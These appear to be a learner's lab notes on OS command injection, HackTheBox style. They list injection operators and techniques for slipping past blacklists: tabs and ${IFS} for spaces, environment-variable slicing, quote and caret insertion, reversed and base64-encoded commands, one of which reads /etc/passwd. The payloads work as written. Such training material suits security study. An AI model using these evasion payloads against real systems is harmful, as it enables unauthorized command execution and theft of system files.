# Detection

|**Injection Operator**|**Injection Character**|**URL-Encoded Character**|**Executed Command**|
|---|---|---|---|
|Semicolon|`;`|`%3b`|Both|
|New Line|`\n`|`%0a`|Both|
|Background|`&`|`%26`|Both (second output generally shown first)|
|Pipe|`\|`|`%7c`|Both (only second output is shown)|
|AND|`&&`|`%26%26`|Both (only if first succeeds)|
|OR|`\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell|` `` `|`%60%60`|Both **(Linux-only)**|
|Sub-Shell|`$()`|`%24%28%29`|Both **(Linux-only)**|
We can use any of these operators to inject another command so `both` or `either` of the commands get executed. `We would write our expected input (e.g., an IP), then use any of the above operators, and then write our new command.`

# Injecting Commands

```bash
ping -c 1 127.0.0.1; whoami
```

# Injection Operators

We can start with the `AND` (`&&`) operator, such that our final payload would be (`127.0.0.1 && whoami`), and the final executed command would be the following:

```bash
ping -c 1 127.0.0.1 && whoami
```

Finally, let us try the `OR` (`||`) injection operator. The `OR` operator only executes the second command if the first command fails to execute. This may be useful for us in cases where our injection would break the original command without having a solid way of having both commands work. So, using the `OR` operator would make our new command execute if the first one fails.

```shell
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 || whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
```

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

# Identifying Filters

Let us start by visiting the web application in the exercise at the end of this section. We see the same `Host Checker` web application we have been exploiting, but now it has a few mitigations up its sleeve. We can see that if we try the previous operators we tested, like (`;`, `&&`, `||`), we get the error message `invalid input`:

![[Pasted image 20251012144110.png]]

In this case, we see it in the field where the output is displayed, meaning that it was detected and prevented by the `PHP` web application itself. `If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`.

## Blacklisted Characters

If any character in the string we sent matches a character in the blacklist, our request is denied. Before we start our attempts at bypassing the filter, we should try to identify which character caused the denied request.

Try different characters to identify blacklisted characters:
- new-line -> `%0A`
- & -> `%26`
- | -> `%7C`

# Bypass Space Filters

## Using Tabs

Using tabs (`%09`) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same. So, let us try to use a tab instead of the space character (`127.0.0.1%0a%09`) and see if our request is accepted:

![[Pasted image 20251012162413.png]]

Then we can try payloads : `ip=127.0.0.1%0als%09%-la`
## Using $IFS

Using the (`$IFS`) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use `${IFS}` where the spaces should be, the variable should be automatically replaced with a space, and our command should work.

Let us use `${IFS}` and see if it works (`127.0.0.1%0a${IFS}`):

![[Pasted image 20251012162353.png]]

Then we can try payloads : `ip=127.0.0.1%0als${IFS}-la`
## Brace Expansion

There are many other methods we can utilize to bypass space filters. For example, we can use the `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, as follows:

```shell
akhmadkun@htb[/htb]$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

As we can see, the command was successfully executed without having spaces in it. We can utilize the same method in command injection filter bypasses, by using brace expansion on our command arguments, like (`127.0.0.1%0a{ls,-la}`).

# Bypass Other Blaclisted Characters

## Linux

There are many techniques we can utilize to have slashes in our payload. One such technique we can use for replacing slashes (`or any other character`) is through `Linux Environment Variables` like we did with `${IFS}`. While `${IFS}` is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specify `start` and `length` of our string to exactly match this character.

For example, if we look at the `$PATH` environment variable in Linux, it may look something like the following:

```shell
akhmadkun@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:

```shell
akhmadkun@htb[/htb]$ echo ${PATH:0:1}

/
```

We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:

```shell
akhmadkun@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

![[Pasted image 20251012164232.png]]

## Windows

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\


PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>
```

## Character Shifting

There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

```shell
akhmadkun@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
akhmadkun@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

---
# Bypass Blacklisted Commands

![[Pasted image 20251012165034.png]]

A basic command blacklist filter in `PHP` would look like the following:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

## Linux & Windows

One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like `Bash` or `PowerShell` and will execute the same command as if they were not there. Some of these characters are a single-quote `'` and a double-quote `"`, in addition to a few others.

The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the `whoami` command, we can insert single quotes between its characters, as follows:

```shell
akhmad@yoga in ~  
❯ wh'oam'i  
akhmad  
  
akhmad@yoga in ~  
❯ who"am"i  
akhmad
```

## Linux Only

We can insert a few other Linux-only characters in the middle of commands, and the `bash` shell would ignore them and execute the command. These characters include the backslash `\` and the positional parameter character `$@`.

```bash
akhmad@yoga in ~  
❯ who$@ami  
akhmad

akhmad@yoga in ~  
❯ who\ami  
akhmad
```

## Windows Only

```cmd
C:\htb> who^ami

21y4d
```

---
# Advanced Command Obfuscation

## Case Manipulation

 In `Windows`, commands for PowerShell and CMD are `case-insensitive`, meaning they will execute the command regardless of what case it is written in:
 
 ```powershell
PS C:\htb> WhOaMi

21y4d
```

However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:

```bash
akhmad@yoga in ~  
❯ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  
akhmad
```

## Reversed Commands

```shell
akhmadkun@htb[/htb]$ echo 'whoami' | rev
imaohw
```

Then, we can execute the original command by reversing it back in a sub-shell (`$()`), as follows:

```bash
akhmad@yoga in ~  
❯ $(rev<<<'imaohw')  
akhmad
```

The same can be applied in `Windows.` We can first reverse a string, as follows:

```powershell
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

We can now use the below command to execute a reversed string with a PowerShell sub-shell (`iex "$()"`), as follows:

```powershell
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

## Encoded Commands

```shell
akhmad@yoga in ~  

❯ echo -n 'cat /etc/passwd | grep akhmad' | base64  
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCBha2htYWQ=
```

Now we can create a command that will decode the encoded string in a sub-shell (`$()`), and then pass it to `bash` to be executed (i.e. `bash<<<`), as follows:

```shell
akhmad@yoga in ~  

❯ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCBha2htYWQ=)  
akhmad:x:1000:1000:Akhmad Mukhammad:/home/akhmad:/bin/bash
```

We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:

```powershell
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

```powershell
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```